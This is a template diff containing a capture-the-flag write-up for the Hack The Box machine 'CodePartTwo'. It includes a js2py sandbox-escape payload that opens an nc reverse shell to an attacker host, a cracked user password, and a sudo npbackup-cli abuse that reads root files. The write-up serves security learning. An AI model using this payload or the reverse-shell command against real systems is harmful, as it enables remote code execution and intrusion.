@@ -1,0 +1,179 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB CodePartTwo</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>sudo nmap -p- -sVC [Target_IP] --min-rate 2000 > ~/tempo/nmap.txt</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/1-nmap.png' %}" alt="">
+        <p class="text">It's basic. Let's take a look at the website.</p>
+    </div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/2-site.png' %}" alt="">
+        <p class="text">
+            Before pentest the site, there is a button named 'Download app'. This button allows us to donwload this website's source code, and includes the structure of the website. <br>
+            You can see a datanase inside of the dir 'instance', but the database doesn't include other user information except you. But we can get some insights from this.
+        </p>
+    </div>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/Downloads/app]
+└─$ ls
+app.py  instance  requirements.txt  static  templates
+</code></pre></div>
+
+    <p class="text">As you can see, there is a file 'app.py' which is the core of this website, but we can see any web-vulnerability. Only juicy information is here,</p>
+
+    <div class="code-box"><pre><code>@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        password_hash = <u>hashlib.md5(password.encode()).hexdigest()</u>
+        user = User.query.filter_by(username=username, password_hash=password_hash).first()
+        if user:
+            session['user_id'] = user.id
+            session['username'] = username;
+            return redirect(url_for('dashboard'))
+        return "Invalid credentials"
+    return render_template('login.html')</code></pre></div>
+
+    <p class="text">Remember, this website uses the md5 for password-hashing. Let's continue.</p>
+
+    <h2 class="subtitle">Foothold</h2>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/Downloads/app]
+└─$ cat requirements.txt       
+flask==3.0.3
+flask-sqlalchemy==3.1.1
+js2py==0.74
+</code></pre></div>
+
+    <p class="text">Because there were no vulnerabilities inside the main program file, we suspect the libralies used for the website.</p>
+    <p class="text">While I research those libralies, I found interesting <a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape">info.</a></p>
+    <p class="text">It says the js2py under ver0.74 has RCE vulnerability. </p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/3-dashboard.png' %}" alt="">
+        <p class="text">Fine. It seems that we can run JavaScript code with this input field, and this input field uses js2py to evaluate user input JS code.</p>
+        <p class="text">The info that I introduced before has poc.py, and the part of the payload looks usable.</p>
+    </div>
+
+    <p class="text">This part is JS code, so we can use this with little modification.</p>
+
+    <div class="code-box"><pre><code>let cmd = <u>"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [Your_IP] 4444 >/tmp/f"</u>
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11</code></pre></div>
+
+    <div class="code-box"><pre><code>nc -lvnp 4444</code></pre></div>
+    <p class="text">Open socket with nc, and just paste this payload to input field.</p>
+
+
+    <h2 class="subtitle">Lateral Movement</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/4-appuser.png' %}" alt="">
+        <p class="text">Easy enough. We could get app user, which is sandbox user. We haven't gotten any privilege inside of the target machine, so we need to find the way to get user flag. <br>Do you remember that we've seen users.db file? Probably the file include target's user. </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/5-md5.png' %}" alt="">
+        <p class="text">As expected, it does have usre 'app' and 'marco'. Marco must be the target user who has user flag. </p>
+    </div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/6-md5.png' %}" alt="">
+        <p class="text">We could get plaintext password without complex tools. Marco's passowrd is <u>sweetangelbabylove</u>. <br>Let's get into target box.</p>
+    </div>
+
+    <div class="code-box"><pre><code>ssh marco@[Target_IP]</code></pre></div>
+
+    <h2 class="subtitle">Privilege Escalation</h2>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/CodePartTwo/7-sudo-l.png' %}" alt="">
+        <p class="text">This user has sudo right with <u>/usr/local/bin/npbackup-cli</u>.</p>
+    </div>
+
+
+    <p class="text">It runs backups, restores, lists snapshots, enforces retention/prune/checks, and can be scheduled. It uses a simple config file and supports multiple repositories/backends (local, SFTP/S3).</p>
+
+    <p class="text">Therefore, if we could change the core directory to restore, we can read root flag. Let's try.</p>
+
+    <div class="code-box"><pre><code>cp npbackup.conf /tmp/backup.conf  #This command copies new editable conf file.</code></pre></div>
+    <p class="text">Then, <strong>change the line into <u>/root</u></strong></p>
+
+    <div class="code-box"><pre><code>conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+       <u>- /home/app/app/</u>
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+</code></pre></div>
+
+
+    <p class="text">Then, backup created file with this code</p>
+    <div class="code-box"><pre><code>sudo npbackup-cli -c backup.conf -b -f</code></pre></div>
+
+
+    <p class="text">Read the root flag</p>
+    <div class="code-box"><pre><code>sudo npbackup-cli -c backup.conf --dump /root/root.txt</code></pre></div>
+
+
+
+    <h2 class="subtitle">PoC details</h2>
+    <p class="text">If you are interested in the js2py and npbackup-cli vulnerabilities, you can visit URL below.</p>
+    <h2 class="subtitle"><a href="{% url 'js2py' %}">js2py vulnerability</a></h2>
+    <h2 class="subtitle"><a href="{% url 'npbackup_cli' %}">npbackup_cli</a></h2>
+
+
+
+
+
+    <div class="img">
+        <img src="" alt="">
+        <p class="text">----------------------</p>
+    </div>
+</body>
+</html>
